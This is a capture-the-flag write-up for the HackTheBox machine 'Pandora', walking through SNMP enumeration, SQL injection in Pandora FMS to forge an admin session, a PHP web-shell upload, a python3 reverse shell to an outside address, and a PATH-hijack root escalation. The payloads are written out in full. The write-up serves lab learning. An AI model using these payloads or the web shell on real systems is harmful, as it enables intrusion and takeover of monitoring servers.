# HackTheBox-Pandora

## NMAP

```bash
PORT   STATE SERVICE VERSION                                           
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))                 
|_http-favicon: Unknown favicon MD5: 115E49F9A03BB97DEB840A3FE185434C
| http-methods:                                                        
|_  Supported Methods: GET HEAD POST OPTIONS 
|_http-server-header: Apache/2.4.41 (Ubuntu) 
|_http-title: Play | Landing    
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## PORT 80 (HTTP)

Visting the web page it seems like a template 

<img src="https://i.imgur.com/Ypkc02a.png"/>

And doesn't display anything interesting , running `gobuster` to fuzz for files and directories

<img src="https://i.imgur.com/cEyrmTB.png"/>

It doesn't find anything as well , so I thought of doing a subdomain enumeration using `wfuzz` but that failed as well

<img src="https://i.imgur.com/Tl4S04t.png"/>

So the web application didn't had anything interesting so I starting to scan for udp port and found `snmp` service to be running

<img src="https://i.imgur.com/7eHFH35.png"/>

## Foothold

To enumerate snmp service there's a tool called `snmp-walk` so we can enumerate the running process ,interface and operating system through that

<img src="https://i.imgur.com/dkaO3eY.png"/>

Keeping this tool running ,after 30 minutes I saw a process with credentials being passed on

<img src="https://i.imgur.com/bFEjymj.png"/>

<img src="https://i.imgur.com/Xkb4dmd.png"/>

Checking the apache2 vhosts file we can see that there's a subdomain `pandora.panda.htb`  and it's being ran as user `matt` but only on localhost so we need to do portforwarding in order to access it through our browser

<img src="https://i.imgur.com/v8Tpn8z.png"/>

```bash
ssh -L 2222:127.0.0.1:80 daniel@panda.htb
```

<img src="https://i.imgur.com/WhEuvNU.png"/>

Also to add domain names to /etc/hosts file

<img src="https://i.imgur.com/GMHIulL.png"/>

Navigating to that port through browser will present us a login page for `Pandora`

<img src="https://i.imgur.com/KLEMHur.png"/>

Going back to pandora's directory we can read some files out which there's a file named `pandoradb_data.sql` which has some queries , we see a query for `admin` user having his password hash

<img src="https://i.imgur.com/fjLXbfj.png"/>

So trying to login with daniel on pnadora we get an error that we are only allowed to use api

<img src="https://i.imgur.com/biHvgT2.png"/>

Looking at the documention of api  , we can use operations to get some data from pandora

https://pandorafms.com/manual/en/documentation/08_technical_reference/02_annex_externalapi

```bash
http://127.0.0.1:2222/pandora_console/include/api.php?op=get&op2=list_all_user&return_type=json&other=1&other_mode=url_encodeseparator|&apipass=1234&user=daniel&pass=HotelBabylon23
```

<img src="https://i.imgur.com/0q6uIxQ.png"/>

We can see that daniel is only allowed to read data from opearations  , we can also get password hashes of users but those were not crackable

```bash
http://127.0.0.1:2222/pandora_console/include/api.php?op=get&op2=users&return_type=json&other=1&other_mode=url_encodeseparator|&apipass=1234&user=daniel&pass=HotelBabylon23
```

<img src="https://i.imgur.com/KVO8h0v.png"/>

Looking for exploits I found remote code execution but that requires us to be authenticated and be an admin user

<img src="https://i.imgur.com/oUV7xHW.png"/>

The second exploit was related to sqli in`/include/chart_generator.php?session_id='` 

<img src="https://i.imgur.com/7Ypb5tV.png"/>

We can verify that there's a sqli by breaking the query with `'`

<img src="https://i.imgur.com/1Zlznh8.png"/>

Now to check how many columns are there we can use `ORDER BY`

<img src="https://i.imgur.com/ySUYSqb.png"/>

It doesn't give any mysql errors so we are good ,let's increase a number 

<img src="https://i.imgur.com/EFDGw8S.png"/>

<img src="https://i.imgur.com/gRSBwMT.png"/>

<img src="https://i.imgur.com/t2o2s10.png"/>

And it gives an error when try to sort table by the fourth column which doesn't exists and it gives an sql error so there are 3 columns in the table from which it's fetching the data

## Rabbit Hole

so let's using `sqlmap` to dump data , we can either just directly supply the url or save the request through burp , I find saving the request convenient for me so I'll go with that

<img src="https://i.imgur.com/Vx247rS.png"/>

And it's going to start dumping the database

<img src="https://i.imgur.com/Xqkr0Lq.png"/>

Now here what we have fallen into a rabbit hole , by dumping the database we can find session id for users on pandora fms but those are only for matt and daniel , daniel only has access to api and matt is just a normal user 

<img src="https://i.imgur.com/Y8w30L4.png"/>

In `PHPSESSSION` replace the session 

<img src="https://i.imgur.com/Z3j2ciT.png"/>

<img src="https://i.imgur.com/nqfPgye.png"/>

But we can't really do much being matt user 

<img src="https://i.imgur.com/CZGEU2Z.png"/>

## Privilege Escalation (Matt)

So going back to the url which was vulnerable to sqli we can elevate our privilegs to become admin user by following this article 

https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained

<img src="https://i.imgur.com/KrpA7rY.png"/>

Checking the columns of the table that what values it expects , we can look in the `pandoradb.sql` file that `tsession_php` has three columns 

<img src="https://i.imgur.com/kqaOfig.png"/>

Our sqli payload would look like this 

```sql
union+select+'randomshit_token','1638796349','id_usuario|s:5:"admin";'+--+
```

it's using select statement to allow a phpsesssion to be created against the admin user with the token we provided ,it could be anything 

<img src="https://i.imgur.com/6HZ29jk.png"/>

Running this it doesn't show any errors which means it got executed correctly and now replacing the PHPSESSION with our token 

<img src="https://i.imgur.com/pQGOky6.png"/>

We are now logged in as admin user now all that is left is to use the rce exploit, I tried the exploit from exploit-db but it didn't worked 


Then saw a php file upload exploit from a youtube video 

<img src="https://i.imgur.com/gViN9jj.png"/>

<img src="https://i.imgur.com/tj7cght.png"/>

So we can make a php file which will allow us to execute comamnds and make a zip archive of that php as we need to upload that as an extension 

```php
<?php system($_GET['cmd']); ?>
```

<img src="https://i.imgur.com/H1lhKet.png"/>

Then upload the archive file having the php file

<img src="https://i.imgur.com/JKzbAY3.png"/>

<img src="https://i.imgur.com/20h7CaH.png"/>

After uploading the file , execute the file through `http://127.0.0.1:2222/pandora_console/extensions/shell.php`

<img src="https://i.imgur.com/OluufnP.png"/>

<img src="https://i.imgur.com/Jcs8MbI.png"/>

We can get a reverse shell through `python3`

```python
python3%20-c%20%27import%20socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.17%22,3333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(%22/bin/sh%22)%27
```

<img src="https://i.imgur.com/E3V1OOY.png"/>

Stabilizing the shell with python3

<img src="https://i.imgur.com/qgZzikg.png"/>

## Privilege Escalation (root)

Let's try to see if we have any privileges to run something as a root user `sudo -l` but it gives an error.

<img src="https://i.imgur.com/y4tgbT9.png"/>

So this can be fixed by generating pair of ssh keys and logging.

<img src="https://i.imgur.com/ZZsQQQS.png"/>

But it seems we can't run anything as a root user ,so moving on for fidining SUID binaries
<img src="https://i.imgur.com/n01k5e2.png"/>

This binary seems suspicious as this isn't available by default, transferring the `pandora_backup` binary we can see that it's using `tar` to create an archive from `/var/www/pandora/pandora_console/*` in  `/root/.backup` and the archive name `pandora-backup.tar.gz`

<img src="https://i.imgur.com/KrJ5QJ1.png"/>

So this is vulnerable to PATH variable exploit , we can create a file named `tar` which will make `bash` a SUID binary and making it executable

<img src="https://i.imgur.com/tPlCpU2.png"/>

Then exporting the PATH variable 

```bash
export PATH=/tmp:$PATH
```

As we run the binary it will make bash a SUID 

<img src="https://i.imgur.com/hFtNd8u.png"/>

<img src="https://i.imgur.com/vizMA4B.png"/>



## References

- https://book.hacktricks.xyz/pentesting/pentesting-snmp
- https://vuldb.com/?id.174621
- https://pandorafms.com/manual/en/documentation/08_technical_reference/02_annex_externalapi
- https://www.exploit-db.com/exploits/48280
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-32099
- https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained
- https://www.youtube.com/watch?v=rJXusinFPw4
- https://k4m1ll0.com/cve-2020-8500.html
